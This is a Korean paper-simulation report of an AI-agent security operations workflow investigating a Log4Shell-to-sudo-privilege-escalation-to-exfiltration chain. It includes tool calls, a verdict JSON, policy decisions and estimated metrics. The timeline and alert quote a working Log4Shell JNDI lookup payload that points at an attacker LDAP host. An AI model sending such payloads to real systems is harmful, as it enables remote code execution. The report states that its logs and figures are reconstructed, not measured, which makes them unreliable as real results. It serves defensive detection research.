# Agentic SOC 시뮬레이션 보고서 — 실제 CVE 기반 다단계 공격 대응

작성일: 2026-09-18
대상 모델: Qwen3-30B-A3B-Instruct-2507 (MoE, 활성 3B)
실행 환경(가정): ESXi 온프레미스(Groot_A/B/C VM) + Kali 노트북, LLM은 DGX Spark(권장 A-1), vLLM(OpenAI 호환 API)
관련 문서: [PLAN.md](PLAN.md), [suggestion.md](suggestion.md)

> 이 문서는 환경이 구축되었다고 가정한 **모의(paper) 시뮬레이션**이다. 실제 로그와 모델 출력을 수집한 것이 아니라, 실제 CVE의 공개된 동작을 근거로 설계대로 동작했을 때의 흐름을 재구성한 것이다. 성능 수치는 아래 6장에 계산 근거를 제시하되, 실제 측정으로 대체되어야 한다.

---

## 1. 시뮬레이션 개요

| 항목 | 내용 |
|---|---|
| 시나리오 | Scenario 4 — 실제 CVE 기반 다단계 공격 |
| 초기 침투 CVE | **CVE-2021-44228 (Log4Shell)** — CVSS 10.0, CISA KEV 등재 |
| 권한 상승 CVE | **CVE-2021-3156 (sudo Baron Samedit)** — CVSS 7.8, CISA KEV 등재 |
| 공격자 | Kali (공격자 노트북, 192.168.10.20), 외부 세그먼트. 공개 PoC + 악성 LDAP 서버 |
| 피해 대상 | Groot_C (웹서버 VM, 172.16.20.10), DVWA + 취약 log4j 번들 웹앱 + 취약 sudo 패키지 |
| 트리거 | Suricata Log4j JNDI 시그니처 → Wazuh Alert (level 12) → Indexer 폴링으로 Agent 수신 |
| Ground Truth | 다단계 공격 성공, log4shell로 코드 실행, sudo로 root 권한 상승, 데이터 유출. 적절 대응 = 출발지/유출지 차단(자동) + 서버 격리(사람 승인) |

**CVE를 실제로 쓰는 이유**: 임의 취약점 대신 실제 CVE를 쓰면 (1) 공개 익스플로릿으로 재현 가능, (2) 실제 CVSS/KEV로 위험도 근거 확보, (3) Wazuh Vulnerability Detection이 실제로 매핑하는지 검증 가능, (4) Agent가 CVE 조회로 판단을 정당화할 수 있다.

---

## 2. 공격 타임라인 (Ground Truth)

| 시각 (KST) | 단계 | 공격 행위 | 남는 흔적 |
|---|---|---|---|
| 14:02:11 | 정찰 (T1595) | nmap SYN 스캔 | Suricata ET SCAN |
| 14:07:44 | 취약점 스캔 (T1595) | 웹 스캐너, log4j 탐지 페이로드 | 404/에러 폭증 |
| 14:15:02 | 초기 침투 (T1190) | `User-Agent: ${jndi:ldap://192.168.10.20:1389/x}` 요청 → 서버가 공격자 LDAP로 outbound | **Suricata Log4j JNDI 룰 + 172.16.20.10→192.168.10.20:1389 아웃바운드** |
| 14:15:04 | 코드 실행 (T1059) | 악성 클래스 로드 → 앱 계정 리버스 셸 | www-data의 sh→java→python3 프로세스 |
| 14:18:20 | 권한 상승 (T1068) | sudo Baron Samedit(CVE-2021-3156)로 root 획득 | sudo 비정상 실행, root 프로세스 |
| 14:22:48 | 유출 (T1041) | DB 덤프를 203.0.113.77:4444로 전송 | Suricata 의심 아웃바운드, 신규 포트 |

Wazuh는 14:15:05에 Suricata Log4j JNDI 시그니처를 level 12 Alert로 생성했고, 이것이 조사 트리거가 되었다.

---

## 3. Agent 조사 과정 (턴별 재구성)

트리거 Alert:
```json
{
  "timestamp": "2026-09-18T14:15:05.4+0900",
  "rule": { "id": 86600, "level": 12,
            "description": "Suricata: ET EXPLOIT Apache log4j RCE Attempt (JNDI LDAP)",
            "mitre": { "id": ["T1190"], "tactic": ["Initial Access"] } },
  "agent": { "id": "003", "name": "groot-c", "ip": "172.16.20.10" },
  "data": { "src_ip": "192.168.10.20", "dest_ip": "172.16.20.10",
            "payload": "User-Agent: ${jndi:ldap://192.168.10.20:1389/x}" }
}
```

### 턴 1 — 상황 이해 + 취약점 확인

Agent 추론: "JNDI LDAP 페이로드는 Log4Shell 패턴이다. 먼저 이 호스트가 실제로 log4j에 취약한지, 그리고 서버가 공격자에게 outbound를 실제로 냈는지 확인한다."

호출:
```
wazuh_get_vulnerabilities(agent_id="003")
network_search_suricata(src_ip="172.16.20.10", since="15m")
```
응답(요약):
- 취약점 목록: sudo 1.9.5 (**CVE-2021-3156, KEV**), 그 외. log4j는 앱 jar 내부라 패키지 목록에는 없음.
- Suricata: **14:15:03 172.16.20.10 → 192.168.10.20:1389 LDAP 아웃바운드 성공**. JNDI 콜백이 실제로 나갔음을 확인.

판단 갱신: outbound가 성립했으므로 Log4Shell 익스플로잇이 트리거됨. 코드 실행 가능성 높음.

### 턴 2 — CVE 상세 조회

Agent 추론: "관측된 패턴을 알려진 CVE와 연결해 위험도를 확정한다."

호출:
```
cve_lookup(cve_id="CVE-2021-44228")
```
응답(요약): Log4Shell, CVSS 10.0, RCE, **CISA KEV 등재(악용 확인됨)**. JNDI lookup으로 원격 클래스 로드.

Agent: KEV 등재 + 실제 아웃바운드 관측 → 위험도 critical로 상향.

### 턴 3 — 코드 실행 흔적 확인

호출:
```
server_get_processes(agent_id="003")
server_get_fim_events(agent_id="003", since="15m")
```
응답(요약):
- 프로세스: `www-data`의 java 프로세스가 `/bin/sh -c` → `python3 -c "...socket..."` 자식 보유 (리버스 셸 패턴)
- FIM: /tmp에 신규 실행 파일, 웹앱 로그에 예외 스택

코드 실행 확인.

### 턴 4 — 권한 상승 여부 확인

Agent 추론: "턴 1에서 이 호스트는 CVE-2021-3156(sudo)에 취약하다. 코드 실행 후 이 경로로 권한 상승했는지 확인한다."

호출:
```
server_get_auth_events(agent_id="003", since="15m")
server_run_readonly(agent_id="003", cmd="ps -eo user,pid,cmd | grep -E '^root'")   # SSH 읽기전용, 허용 명령
```
응답(요약):
- auth: 정상 로그인은 없으나 14:18 sudo 관련 비정상 로그
- root 소유의 셸 프로세스 존재 → **권한 상승 성공**

Agent: CVE-2021-3156 경로로 root 획득 확인. 사전에 취약점 목록에서 이 CVE를 봤기 때문에 이 확인이 가능했다.

### 턴 5 — 유출 확인 및 최종 판단

호출:
```
network_search_suricata(src_ip="172.16.20.10", since="10m")
```
응답: 14:22 172.16.20.10 → 203.0.113.77:4444 지속 아웃바운드, 대용량 전송.

최종 출력(JSON):
```json
{
  "verdict": "confirmed_compromise",
  "root_cause": { "cve": "CVE-2021-44228", "cvss": 10.0, "kev": true },
  "attack_chain": [
    { "stage": "Reconnaissance", "mitre": "T1595", "evidence": "nmap 14:02" },
    { "stage": "Initial Access", "mitre": "T1190", "cve": "CVE-2021-44228",
      "evidence": "JNDI payload + outbound LDAP 192.168.10.20:1389 14:15" },
    { "stage": "Execution", "mitre": "T1059", "evidence": "java->sh->python3 reverse shell" },
    { "stage": "Privilege Escalation", "mitre": "T1068", "cve": "CVE-2021-3156",
      "evidence": "abnormal sudo 14:18, root shell" },
    { "stage": "Exfiltration", "mitre": "T1041",
      "evidence": "outbound 203.0.113.77:4444 14:22" }
  ],
  "confidence": "high",
  "risk": "critical",
  "proposed_actions": [
    { "action": "block_ip", "target": "192.168.10.20", "reason": "attack source / LDAP callback" },
    { "action": "block_ip", "target": "203.0.113.77", "reason": "exfil destination" },
    { "action": "quarantine_server", "target": "groot-c (172.16.20.10)", "reason": "root compromise + active exfil" }
  ],
  "remediation": [
    "log4j 2.17.1+ 업그레이드 또는 log4j2.formatMsgNoLookups=true",
    "sudo 1.9.5p2+ 패치 (CVE-2021-3156)"
  ]
}
```

Agent는 근본 원인을 실제 CVE로 특정하고, 대응뿐 아니라 패치 권고까지 산출했다.

---

## 4. Policy Engine 판정

| 제안 | 위험도/신뢰도 | 판정 | 근거 |
|---|---|---|---|
| 192.168.10.20 차단 | critical/high | **자동 실행** | 되돌릴 수 있는 임시 차단(1h), 보호 IP 아님 |
| 203.0.113.77 차단 | critical/high | **최소범위 임시 차단 후 통보** | 진행 중 유출, 즉시 차단이 안전 |
| 서버 격리 | critical | **사람 승인 요청** | 서비스 중단 영향, Slack 승인 (Socket Mode) |

담당자 승인 후 Groot_A FW로 세그먼트 격리. 근본 원인이 CVE로 특정되어 있어 승인 판단이 빠르다.

---

## 5. 대응 및 검증

| 조치 | 방식 | 결과 |
|---|---|---|
| 공격원/유출지 IP 차단 | Active Response firewall-drop | 아웃바운드 종료 |
| 서버 격리 | Groot_A FW 세그먼트 격리 | 조사용 접근만 유지 |
| 검증 | Suricata 재조회 | 유출 재발 없음 |
| 사후 | 패치 티켓(log4j, sudo) 생성 | KEV 취약점 제거 |

---

## 6. 성능 추정치 (계산 근거 포함)

DGX Spark GB10은 LPDDR5x 통합 메모리로 대역폭이 약 273 GB/s로 알려져 있다(데이터센터 GPU 대비 낮음). 배치 1 토큰 생성은 메모리 대역폭에 지배된다.

```
Qwen3-30B-A3B: 토큰당 활성 3B 파라미터
BF16: 3B × 2 byte = 6 GB/token
이론 상한 = 273 GB/s ÷ 6 GB/token ≈ 45 tok/s
실측은 오버헤드로 이보다 낮음 → 보수적으로 30~45 tok/s 가정
(FP8/양자화 시 토큰당 바이트가 줄어 상한이 올라감)
```

| 지표 | 추정치 | 근거/비고 |
|---|---|---|
| LLM 턴 수 | 5 | Tool 호출 7회 |
| 출력 생성 속도 | **30~45 tok/s** | 위 대역폭 계산. 이전 초안의 "40~70"은 상단이 비현실적이라 하향 |
| 조사당 출력 토큰 | 약 1,800 | 추론 + tool_call + 최종 JSON |
| 조사당 입력 토큰 | **가변, 상한 관리 필요** | Suricata/Alert 원본을 그대로 넣으면 수만 토큰. Tool 응답을 요약·필드추출해서 넣어야 함(아래 주의) |
| MTTI (조사 완료) | 약 60~120초 | 생성 속도 하향 + 입력 처리 반영해 이전보다 상향 |
| MTTR (대응 완료) | 약 3~5분 | 승인 대기 포함 |

**입력 토큰 주의**: Suricata eve.json과 다건 Alert를 원문 그대로 컨텍스트에 넣으면 조사 한 건이 수만 토큰을 넘어 생성 속도와 무관하게 지연을 유발한다. MCP Tool이 응답 단계에서 필요한 필드만 추출/요약해 반환하도록 설계해야 하며, 이 요약 품질이 MTTI와 판단 정확도 양쪽에 영향을 준다. (설계 반영 필요 항목)

---

## 7. CVE 기반 접근이 검증하는 것

1. **근본 원인 특정** Agent가 "웹 공격"이 아니라 "CVE-2021-44228"까지 짚고 패치 권고를 낸다.
2. **취약점 계층과 조사의 연결** 턴 1에서 확인한 취약점 목록(CVE-2021-3156)이 턴 4의 권한 상승 확인을 이끈다. 12장 Vuln Intelligence 계층이 실전 조사에 실제로 쓰인다.
3. **위험도 근거의 객관화** KEV 등재와 CVSS로 위험도를 정당화한다. 사람 승인 판단이 빨라진다.
4. **재현성** 공개 익스플로릿과 취약 이미지로 실험을 반복·검증할 수 있다.

---

## 8. 정직한 한계

| 한계 | 내용 |
|---|---|
| paper 시뮬레이션 | 실제 모델·로그를 돌린 결과가 아니다. Tool 응답과 판단은 CVE의 공개 동작을 근거로 한 재구성이다 |
| Wazuh log4j 미탐 가능성 | 앱 jar 번들 log4j는 패키지 인벤토리에 없어 Wazuh Vuln Detection이 못 잡을 수 있다. 그래서 초기 침투는 Suricata 시그니처로 탐지하도록 설계했다. sudo CVE는 OS 패키지라 잡힌다 |
| 최선 경로 가정 | 모든 Tool이 정답을 준 경우다. 실제로는 오탐/유실로 헤맬 수 있다(9장) |
| 성능 수치 | 대역폭 계산 기반 추정. 실측 필요 |

---

## 9. 실패·불확실 시나리오 (실험에서 반드시 확인)

| 실패 모드 | 발생 조건 | 완화책 |
|---|---|---|
| log4j 미탐 | Wazuh가 번들 jar를 못 잡고 Suricata 룰도 우회(난독화 페이로드) | Suricata 룰 최신화, 아웃바운드 이상탐지 병행 |
| 오탐 상향 | 정상 아웃바운드를 유출로 오인 | 보호 목적지 allowlist, 포트/지속시간 기준 |
| 조기 종료 | 아웃바운드/권한상승 미확인 후 종결 | 시스템 프롬프트에 "코드실행 흔적 시 아웃바운드·취약점목록 필수 확인" |
| 컨텍스트 폭증 | Tool 원문 과다 | Tool 응답 요약/필드추출, 호출 상한 |
| 프롬프트 인젝션 | User-Agent에 조작 문장(JNDI 페이로드에 섞어) | Tool 결과는 데이터로만, 실행은 Policy Engine (Scenario 5) |
| 30B-A3B 품질 | 32B Dense 대비 추론 누락 | 0단계 두 모델 비교 |

---

## 10. 남은 검증 과제 (실물 실험으로 대체)

- [ ] 취약 이미지 배포: log4shell 취약 앱(log4j 2.14.x), sudo 1.9.5 취약 패키지
- [ ] 공개 익스플로릿으로 실제 공격 재현, Wazuh/Suricata Alert의 rule id 기록
- [ ] Wazuh Vuln Detection이 CVE-2021-3156을 실제로 매핑하는지 확인
- [ ] MTTI/MTTR/토큰/속도 실측으로 6장 수치 대체
- [ ] Qwen3-30B-A3B vs 32B 판단 품질 비교
- [ ] Scenario 0(정상) 오탐률, Scenario 5(인젝션) 방어 확인
- [ ] 10회 반복으로 일관성(편차) 측정
